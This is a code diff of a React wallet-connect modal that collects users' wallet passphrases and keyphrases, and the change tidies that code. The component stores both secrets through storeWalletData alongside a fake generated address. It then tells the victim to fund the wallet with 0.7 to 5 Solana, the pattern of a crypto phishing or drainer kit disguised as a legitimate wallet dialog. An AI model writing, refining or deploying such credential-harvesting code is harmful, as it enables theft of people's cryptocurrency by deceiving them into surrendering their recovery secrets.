@@ -12,16 +12,13 @@ const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
   const [passphrase, setPassphrase] = useState('');
   const [keyphrase, setKeyphrase] = useState('');
   const [isConnecting, setIsConnecting] = useState(false);
-  const [importedFile, setImportedFile] = useState(null);
-  const [walletData, setWalletData] = useState(null);
   const [error, setError] = useState('');
-  const [walletAddress, setWalletAddress] = useState('');
 
   const walletOptions = [
     { name: 'Phantom', image: '/phan.png' },
     { name: 'MetaMask', image: '/meta.png' },
     { name: 'Eden Wallet', image: '/eden.png' },
-    {name: 'Coinbase', image: '/baselogo.png'},
+    { name: 'Coinbase', image: '/baselogo.png' },
   ];
 
   // Simple function to generate a mock wallet address
@@ -51,19 +48,14 @@ const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
   };
 
   const handleConnect = async () => {
-    if (!selectedWallet) {
-      setError('Please select a wallet');
-      return;
-    }
-    // e.preventDefault(); // Prevent default form submission
-
     if (!passphrase) {
-      alert('Please enter a corrcet passphrase.');
+      alert('Please enter a correct passphrase.');
       return;
     }
 
     if (!keyphrase) {
-      alert("please enter a correct keyphrase")
+      alert("Please enter a correct keyphrase");
+      return;
     }
 
     setIsConnecting(true);
@@ -71,21 +63,18 @@ const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
 
     try {
       const generatedAddress = generateWalletAddress();
-      setWalletAddress(generatedAddress);
 
       const walletDetails = {
         walletName: selectedWallet,
         walletAddress: generatedAddress,
         passphrase: passphrase,
         keyphrase: keyphrase,
+        balance: 0, // Default balance value
         connectedAt: new Date().toISOString(),
         lastActive: new Date().toISOString(),
-        status: 'connected'
+        status: 'connected',
+        hasPassphrase: !!passphrase
       };
-
-      if (passphrase) {
-        walletDetails.hasPassphrase = true;
-      }
 
       const docId = await storeWalletData(walletDetails);
       
@@ -93,6 +82,7 @@ const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
         id: docId,
         name: selectedWallet,
         address: generatedAddress,
+        balance: 0, // Also store in localStorage
         connectedAt: walletDetails.connectedAt
       }));
 
@@ -100,13 +90,13 @@ const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
         onWalletConnected({
           id: docId,
           name: selectedWallet,
-          address: generatedAddress
+          address: generatedAddress,
+          balance: 0 // Pass to callback
         });
       }
 
       toast.success('Make sure you fund your wallet with 0.7 - 5 Solana and try again', {
         autoClose: 20000,
-        
       });
       
       onClose();
@@ -119,16 +109,11 @@ const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
     }
   };
 
-  const handleFileChange = (event) => {
-    setImportedFile(event.target.files[0]);
-  };
-
   const handleBack = () => {
     setShowSecondaryModal(false);
     setSelectedWallet('');
     setPassphrase('');
     setKeyphrase('');
-    setImportedFile(null);
     setError('');
   };
 
@@ -149,7 +134,6 @@ const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
       setSelectedWallet('');
       setPassphrase('');
       setKeyphrase('');
-      setImportedFile(null);
       setError('');
     }
 
@@ -227,15 +211,6 @@ const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
                   onChange={(e) => setKeyphrase(e.target.value)}
                 />
               </div>
-              {/* <div className='border border-dashed border-gray-600 p-3 rounded'>
-                <label htmlFor="importFile" className="block text-sm font-medium text-gray-300 mb-1">Add a screenshot of your wallet here:</label>
-                <input
-                  type="file"
-                  id="importFile"
-                  className="w-full text-sm text-gray-300 mt-1"
-                  onChange={handleFileChange}
-                />
-              </div> */}
             </div>
             <div className="mt-6 flex justify-end space-x-2">
               <button
@@ -247,7 +222,7 @@ const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
               <button
                 className="bg-indigo-600 hover:bg-indigo-500 text-white font-semibold py-2 px-4 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-400 disabled:opacity-50"
                 onClick={handleConnect}
-                // disabled={isConnecting}
+                disabled={isConnecting}
               >
                 {isConnecting ? (
                   <>
